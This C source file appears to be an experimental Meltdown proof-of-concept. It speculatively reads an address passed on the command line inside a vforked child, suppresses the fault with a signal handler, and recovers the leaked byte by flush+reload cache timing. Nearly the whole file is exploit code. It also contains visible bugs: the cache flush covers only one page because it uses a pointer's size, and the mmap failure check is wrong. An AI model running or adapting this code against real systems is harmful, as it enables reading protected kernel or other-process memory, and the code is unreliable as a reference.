#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include <signal.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

static uint64_t
rdtscp(void)
{
    uint64_t high;
    uint64_t low;

    asm volatile("mfence");
    asm volatile("rdtscp":
                 "=a"(low),
                 "=d" (high));
    asm volatile("mfence");
    return ((uint64_t)high << 32) | (uint64_t)low;
}

void
race_addr(uint8_t *probe, uint64_t addr)
{
    // this is probably from the poc, but don't remember where 
    printf("vroom vroom child pid %ju\n", (uint64_t)getpid());
    asm (
        "xorq %%rax,%%rax;"
        "1:\tmovb (%%rcx),%%al;"
        "shlq $0xc,%%rax;" /* multiply by page size 4096 */
        "jz 1b;" /* if we lose the race, retry */
        "movq (%1, %%rax, 1),%1;" /* speculative read of buffer */
        :
        : "c" (addr), "b" (probe)
        : "cc", "rax"
    );

    printf("didn't crash: %ju\n", addr);
    _exit(0);
}

void
handler(int signum, siginfo_t *info, void *ucontext)
{
    printf("got signal %s on %ju\n", strsignal(signum), (uint64_t)getpid());
    _exit(0);
}

void
fork_boop(uint8_t *probe, uint64_t val)
{
    struct sigaction action = {};
    pid_t pid;

    printf("parent pid %ju addr %p\n", (uint64_t)getpid(),
           (void *)(uintptr_t)val);

    action.sa_sigaction = handler;
    action.sa_flags = SA_SIGINFO;
    printf("sigaction %d\n", sigaction(SIGSEGV, &action, NULL));

    pid = vfork();
    if (pid == 0) {
        race_addr(probe, val);
    } else {
        int status=0;
        wait(&status);
        printf("parent got pid %ju result %d\n", (uint64_t)pid, status);

        memset(&action, 0, sizeof(action));
        action.sa_handler = SIG_DFL;
        printf("child sigaction %d\n", sigaction(SIGSEGV, &action, NULL));
    }
}

void
cache_flush(uint8_t *probe, int len)
{
    int i;

    for (i = 0; i < len; i += 4096) {
        asm("clflush (%0)" :: "r" ((void *)&probe[i]));
    }
}

struct cache_result {
    uint64_t time;
    uint8_t val;
    uint8_t index;
};

int
cache_result_cmp(const void *l, const void *r)
{
    const struct cache_result *left = l;
    const struct cache_result *right = r;

    // smallest at the end
    if (left->time < right->time) {
        return 1;
    } else if (left->time > right->time) {
        return -1;
    } else {
        return 0;
    }
}

uint8_t
byte_from_timing(uint8_t *probe, uint8_t *indices)
{
    int i;
    struct cache_result results[256] = {{},};

    for (i = 0; i < 256; i++) {
        uint64_t before;
        int j;

        j = indices[i];
        results[i].index = j;

        asm volatile("" ::: "memory");
        before = rdtscp();
        asm volatile("" ::: "memory");
        results[i].val = probe[j * 4096];
        asm volatile("" ::: "memory");
        results[i].time = rdtscp() - before;
    }

    /**
     * TODO: need to do std deviation or something to make sure it's
     * notably smaller than the next lowest
     */
    uint64_t min = UINT64_MAX;
    uint8_t min_index = 0;
    for (i = 0; i < sizeof(results) / sizeof(results[0]); i++) {
        if (results[i].time < min) {
            min = results[i].time;
            min_index = results[i].index;
        }
    }

    if (min > 145) {
        return 0;
    }

    if (min_index != 0) {
        qsort(results, sizeof(results) / sizeof(results[0]),
              sizeof(results[0]),
              cache_result_cmp);
        for (i = 0; i < 256; i++) {
            printf("0x%02x: %u %ju\n", results[i].index, results[i].val,
                   results[i].time);
        }
    }

    return min_index;
}


void
shuffle(uint8_t *values, int len)
{
    int i;

    // fisher yates
    for (i = len - 1; i > 0; i--) {
        int j = rand() % (i + 1);

        uint8_t tmp = values[i];
        values[i] = values[j];
        values[j] = tmp;
    }
}

int
main(int argc, char **argv)
{
    uint8_t *probe_buf;
    time_t seed;
    uint8_t indices[256];
    int i;

    seed = time(NULL);
    printf("seed %u\n", (unsigned int)seed);
    srand(seed);

    for (i = 0; i < sizeof(indices) / sizeof(indices[0]); i++) {
        indices[i] = (uint8_t)i;
    }
    shuffle(indices, sizeof(indices));

    probe_buf = mmap(NULL, 256 * 4096, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (probe_buf == NULL) {
        printf("mmap failed\n");
        exit(1);
    }


    for (i = 0; i < 100000; i++) { 
        uint8_t b;

        cache_flush(probe_buf, sizeof(probe_buf));
        fork_boop(probe_buf, strtoull(argv[1], NULL, 16));
        b = byte_from_timing(probe_buf, indices);
        if (b != 0) {
            printf("yay? 0x%02x\n", b);
            break;
        }
    }
}
